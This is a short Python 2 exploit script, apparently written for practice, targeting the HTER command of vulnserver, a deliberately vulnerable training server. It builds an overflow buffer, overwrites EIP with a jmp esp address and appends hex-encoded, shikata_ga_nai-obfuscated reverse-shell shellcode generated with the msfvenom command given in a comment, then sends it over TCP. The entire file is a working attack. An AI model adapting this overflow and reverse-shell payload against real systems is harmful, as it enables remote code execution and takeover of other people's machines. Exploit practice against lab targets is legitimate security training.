#!/usr/bin/python

import socket
import sys

host = "192.168.56.103"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver HTER Exploit
## 0x62501203 jmp esp
## msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f hex
shellcode = '4bf9fcf53737f59fd6d637fcfcfd419f9ffd4827dbd2bfccf0b388d97424f45a29c9b152317a1783eafc03b6e3517dbaec147e42ed78f6a7dcb86cac4f09e6e063e2aa10f7866217b02d5516411da539c15cfa99f8ae0fd83dd2e2889698513c92d569b7e8f8e924b8fbd8fbb2a5fafa17deb2e474db0d9f4f978f499e5823b42eab3df18954480beae94bc89035d9ca33bd7936c5121fbdc9df6b99cddeb892ea6b3f747b2f645027eb05c18d5a39116e029f5a83579201cc949fb90cb3a8ca3e1c034473d58d9374cc6a0b8bef8a0248bbda3c79c4b0bc861116ec28cad75c89babfb606e4a0b9cc8d4b4087ce8b4a56598e4a49c507ac03e54167bc9ccbf35d60c67e5deae57f101b8393c5ebdec940f3f4650e669375599b0c220e6d45a6a2d4ffd43e80385ce571c65d68cdec4db4cea83968996697ce73c941992883055c031453614ee2bbd027b3c4ddaf33bd0350bb148060f634a1e85fadf37460183781e3a8c876fbd9cd33bb32bc2c2e34134c7b'

buf = 'HTER '
buf += 'A'*2041
buf += '03125062'       #EIP
buf += shellcode
buf += 'B'*(2875-len(shellcode)-20)


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
